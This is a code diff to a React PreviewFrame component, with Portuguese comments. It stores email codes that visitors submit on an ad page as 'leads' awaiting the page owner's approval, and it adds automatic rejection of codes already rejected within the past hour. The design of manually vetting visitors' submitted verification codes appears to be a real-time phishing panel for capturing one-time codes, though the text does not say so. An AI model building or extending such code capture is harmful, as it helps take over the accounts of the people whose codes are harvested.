@@ -301,6 +301,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
 
         // Código submetido → grava lead e fica esperando aprovação do dono
         if (data.action === "email-code-submit" && adId && typeof data.code === "string" && data.code) {
+          const submittedCode = data.code;
           supabase
             .from("ad_leads")
             .insert({
@@ -308,12 +309,51 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
               screen_id: currentScreenIdRef.current,
               session_id: sessionId,
               field_name: "code_submitted",
-              value: data.code,
+              value: submittedCode,
               user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
             })
             .then(({ error }) => {
               if (error) console.warn("[PreviewFrame] code_submitted insert:", error);
             });
+
+          // Auto-rejeita se esse código já foi rejeitado nas últimas 1h (em qualquer sessão deste anúncio)
+          (async () => {
+            const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
+            const { data: rejectedLeads, error: rejErr } = await supabase
+              .from("ad_leads")
+              .select("session_id, value, created_at")
+              .eq("ad_id", adId)
+              .eq("field_name", "code_submitted")
+              .eq("value", submittedCode)
+              .gte("created_at", oneHourAgo);
+            if (rejErr || !rejectedLeads?.length) return;
+
+            const sessionIds = Array.from(new Set(rejectedLeads.map((r) => r.session_id)));
+            const { data: rejectActions } = await supabase
+              .from("ad_session_actions")
+              .select("session_id, action, created_at")
+              .eq("ad_id", adId)
+              .eq("action", "reject")
+              .in("session_id", sessionIds)
+              .gte("created_at", oneHourAgo);
+
+            const wasRejected = (rejectActions ?? []).some((act) => {
+              return rejectedLeads.some(
+                (lead) =>
+                  lead.session_id === act.session_id &&
+                  lead.created_at <= act.created_at,
+              );
+            });
+
+            if (wasRejected) {
+              await supabase.from("ad_session_actions").insert({
+                ad_id: adId,
+                session_id: sessionId,
+                action: "reject",
+                payload: { message: "Código inválido. Verifique e tente novamente.", auto: true },
+              });
+            }
+          })();
           return;
         }
 
